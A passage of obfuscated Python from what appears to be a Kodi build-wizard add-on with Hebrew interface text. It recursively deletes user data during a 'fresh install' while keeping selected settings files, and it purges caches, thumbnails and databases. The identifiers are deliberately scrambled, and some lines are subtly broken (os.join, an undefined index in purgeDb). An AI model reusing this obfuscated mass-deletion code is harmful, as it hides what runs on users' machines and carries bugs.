				elif O0O000O000OOO0O00 =='MyVideos116.db'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4959
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4960
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'skin.anonymous.mod'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4961
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'skin.Premium.mod'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4962
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'skin.anonymous.nox'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4963
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'skin.phenomenal'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4964
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.metalliq'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4965
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'skin.titan'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4967
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'pvr.iptvsimple'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4968
				elif O0O000O000OOO0O00 =='sources.xml'and O0OOOOO0OOOO00000 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4970
				elif O0O000O000OOO0O00 =='quicknav.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4973
				elif O0O000O000OOO0O00 =='x1101.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4974
				elif O0O000O000OOO0O00 =='b-srtym-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4975
				elif O0O000O000OOO0O00 =='x1102.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4976
				elif O0O000O000OOO0O00 =='b-sdrvt-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4977
				elif O0O000O000OOO0O00 =='x1112.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4978
				elif O0O000O000OOO0O00 =='b-tlvvyzyh-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4979
				elif O0O000O000OOO0O00 =='x1111.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4980
				elif O0O000O000OOO0O00 =='b-tvknyshrly-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4981
				elif O0O000O000OOO0O00 =='x1110.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4982
				elif O0O000O000OOO0O00 =='b-yldym-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4983
				elif O0O000O000OOO0O00 =='x1114.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4984
				elif O0O000O000OOO0O00 =='b-mvzyqh-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4985
				elif O0O000O000OOO0O00 =='mainmenu.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4986
				elif O0O000O000OOO0O00 =='skin.Premium.mod.properties'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4987
				elif O0O000O000OOO0O00 =='x1122.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4989
				elif O0O000O000OOO0O00 =='b-spvrt-b.DATA.xml'and O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4990
				elif O0O000O000OOO0O00 =='favourites.xml'and O0OOOOO0OOOO00000 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4995
				elif O0O000O000OOO0O00 =='guisettings.xml'and O0OOOOO0OOOO00000 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4997
				elif O0O000O000OOO0O00 =='profiles.xml'and O0OOOOO0OOOO00000 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4998
				elif O0O000O000OOO0O00 =='advancedsettings.xml'and O0OOOOO0OOOO00000 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:4999
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5000
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'program.apollo'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5001
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5002
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.telemedia'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5003
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.elementum'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5006
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5008
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'weather.yahoo'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5009
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.quasar'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5010
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'program.apollo'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5011
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5012
				elif O0OOOOO0OOOO00000 [O000000000OOO000O -2 ]=='userdata'and O0OOOOO0OOOO00000 [O000000000OOO000O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0OOOOO0OOOO00000 [O000000000OOO000O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5013
				elif O0O000O000OOO0O00 in LOGFILES :wiz .log ("Keep Log File: %s"%O0O000O000OOO0O00 ,xbmc .LOGNOTICE )#line:5014
				elif O0O000O000OOO0O00 .endswith ('.db'):#line:5015
					try :#line:5016
						if O0O000O000OOO0O00 ==O00OO0OOOOOOOO000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O0O000O000OOO0O00 ,KODIV ),xbmc .LOGNOTICE )#line:5017
						else :os .remove (os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ))#line:5018
					except Exception as OO0OOO0OOO0O0OOO0 :#line:5019
						if not O0O000O000OOO0O00 .startswith ('Textures13'):#line:5020
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5021
							wiz .log ("-> %s"%(str (OO0OOO0OOO0O0OOO0 )),xbmc .LOGNOTICE )#line:5022
							wiz .purgeDb (os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ))#line:5023
				else :#line:5024
					DP .update (int (wiz .percentage (OOO0OOOOO0O0OOO00 ,O0OOO00O0000O0OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000O000OOO0O00 ),'')#line:5025
					try :os .remove (os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ))#line:5026
					except Exception as OO0OOO0OOO0O0OOO0 :#line:5027
						wiz .log ("Error removing %s"%os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),xbmc .LOGNOTICE )#line:5028
						wiz .log ("-> / %s"%(str (OO0OOO0OOO0O0OOO0 )),xbmc .LOGNOTICE )#line:5029
			if DP .iscanceled ():#line:5030
				DP .close ()#line:5031
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5032
				return False #line:5033
		for OO00OO0O0O0OO0OOO ,O0OO00O00O00O0OO0 ,O00O0O0000OO0000O in os .walk (O0O0O0O00O0OOO000 ,topdown =True ):#line:5034
			O0OO00O00O00O0OO0 [:]=[O0O00OO0OO0O00O0O for O0O00OO0OO0O00O0O in O0OO00O00O00O0OO0 if O0O00OO0OO0O00O0O not in EXCLUDES ]#line:5035
			for O0O000O000OOO0O00 in O0OO00O00O00O0OO0 :#line:5036
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0O000O000OOO0O00 ),'')#line:5037
			  if O0O000O000OOO0O00 not in ["Database","userdata","temp","addons","addon_data"]:#line:5038
			   if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5039
			    if not (O0O000O000OOO0O00 =='skin.titan'and KEEPSKIN3 =='true'):#line:5041
			      if not (O0O000O000OOO0O00 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5042
			       if not (O0O000O000OOO0O00 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5043
			        if not (O0O000O000OOO0O00 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5044
			         if not (O0O000O000OOO0O00 =='program.apollo'and KEEPINFO =='true'):#line:5045
			          if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5046
			           if not (O0O000O000OOO0O00 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5047
			            if not (O0O000O000OOO0O00 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5048
			             if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5049
			              if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5050
			               if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5051
			                if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5052
			                 if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5053
			                  if not (O0O000O000OOO0O00 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5054
			                   if not (O0O000O000OOO0O00 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5055
			                    if not (O0O000O000OOO0O00 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5056
			                     if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5057
			                      if not (O0O000O000OOO0O00 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5058
			                       if not (O0O000O000OOO0O00 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5059
			                           if not (O0O000O000OOO0O00 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5063
			                            if not (O0O000O000OOO0O00 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5064
			                             if not (O0O000O000OOO0O00 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5065
			                              if not (O0O000O000OOO0O00 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5066
			                               if not (O0O000O000OOO0O00 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5067
			                                  shutil .rmtree (os .path .join (OO00OO0O0O0OO0OOO ,O0O000O000OOO0O00 ),ignore_errors =True ,onerror =None )#line:5069
			if DP .iscanceled ():#line:5070
				DP .close ()#line:5071
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5072
				return False #line:5073
		DP .close ()#line:5074
		wiz .clearS ('build')#line:5075
		if over ==True :#line:5076
			return True #line:5077
		elif install =='restore':#line:5078
			return True #line:5079
		elif install :#line:5080
			buildWizard (install ,'normal',over =True )#line:5081
		else :#line:5082
			if INSTALLMETHOD ==1 :O00O000OOOO0O00OO =1 #line:5083
			elif INSTALLMETHOD ==2 :O00O000OOOO0O00OO =0 #line:5084
			else :O00O000OOOO0O00OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5085
			if O00O000OOOO0O00OO ==1 :wiz .reloadFix ('fresh')#line:5086
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5087
	else :#line:5088
		if not install =='restore':#line:5089
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5090
			wiz .refresh ()#line:5091
def clearCache ():#line:5096
		wiz .clearCache ()#line:5097
def fixwizard ():#line:5101
		wiz .fixwizard ()#line:5102
def totalClean ():#line:5104
		wiz .clearCache ()#line:5106
		wiz .clearPackages ('total')#line:5107
		clearThumb ('total')#line:5108
		cleanfornewbuild ()#line:5109
def cleanfornewbuild ():#line:5110
		try :#line:5111
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5112
		except :#line:5113
			pass #line:5114
		try :#line:5115
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5116
		except :#line:5117
			pass #line:5118
		try :#line:5119
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5120
		except :#line:5121
			pass #line:5122
def clearThumb (type =None ):#line:5123
	OO0O0O0OO0OO0OOOO =wiz .latestDB ('Textures')#line:5124
	if not type ==None :O0000O0OO0O0O00OO =1 #line:5125
	else :O0000O0OO0O0O00OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO0O0O0OO0OO0OOOO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5126
	if O0000O0OO0O0O00OO ==1 :#line:5127
		try :wiz .removeFile (os .join (DATABASE ,OO0O0O0OO0OO0OOOO ))#line:5128
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO0O0O0OO0OO0OOOO )#line:5129
		wiz .removeFolder (THUMBS )#line:5130
	else :wiz .log ('Clear thumbnames cancelled')#line:5132
	wiz .redoThumbs ()#line:5133
def purgeDb ():#line:5135
	OO0000000O0O0OOO0 =[];O000000000O0O000O =[]#line:5136
	for O0OOO0O0OOOOO0OOO ,OO000OOOO0O00OO00 ,O0OOOO0O00OO0OO00 in os .walk (HOME ):#line:5137
		for OOOO0O0O0OO0OOO0O in fnmatch .filter (O0OOOO0O00OO0OO00 ,'*.db'):#line:5138
			if OOOO0O0O0OO0OOO0O !='Thumbs.db':#line:5139
				O00000OO0000OOOO0 =os .path .join (O0OOO0O0OOOOO0OOO ,OOOO0O0O0OO0OOO0O )#line:5140
				OO0000000O0O0OOO0 .append (O00000OO0000OOOO0 )#line:5141
				O000OOO0OOOOO00O0 =O00000OO0000OOOO0 .replace ('\\','/').split ('/')#line:5142
				O000000000O0O000O .append ('(%s) %s'%(O000OOO0OOOOO00O0 [len (O000OOO0OOOOO00O0 )-2 ],O000OOO0OOOOO00O0 [len (O000OOO0OOOOO00O0 )-1 ]))#line:5143
	if KODIV >=16 :#line:5144
		OOO0O0O00OO0OOO0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000000000O0O000O )#line:5145
		if OOO0O0O00OO0OOO0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5146
		elif len (OOO0O0O00OO0OOO0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5147
		else :#line:5148
			for O0OO000O000O00O00 in OOO0O0O00OO0OOO0O :wiz .purgeDb (OO0000000O0O0OOO0 [O0OO000O000O00O00 ])#line:5149
	else :#line:5150
		OOO0O0O00OO0OOO0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000000000O0O000O )#line:5151
		if OOO0O0O00OO0OOO0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5152
		else :wiz .purgeDb (OO0000000O0O0OOO0 [O0OO000O000O00O00 ])#line:5153
def fastupdatefirstbuild (OOO000OOO000O00OO ):#line:5159
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5161
	if ENABLE =='Yes':#line:5162
		if not NOTIFY =='true':#line:5163
			O00O0OOO0O0O0OO00 =wiz .workingURL (NOTIFICATION )#line:5164
			if O00O0OOO0O0O0OO00 ==True :#line:5165
				O0O00OO0OOOOOOOO0 ,OOO0OO000O0OOO0OO =wiz .splitNotify (NOTIFICATION )#line:5166
				if not O0O00OO0OOOOOOOO0 ==False :#line:5168
					try :#line:5169
						O0O00OO0OOOOOOOO0 =int (O0O00OO0OOOOOOOO0 );OOO000OOO000O00OO =int (OOO000OOO000O00OO )#line:5170
						checkidupdate ()#line:5171
						wiz .setS ("notedismiss","true")#line:5172
						if O0O00OO0OOOOOOOO0 ==OOO000OOO000O00OO :#line:5173
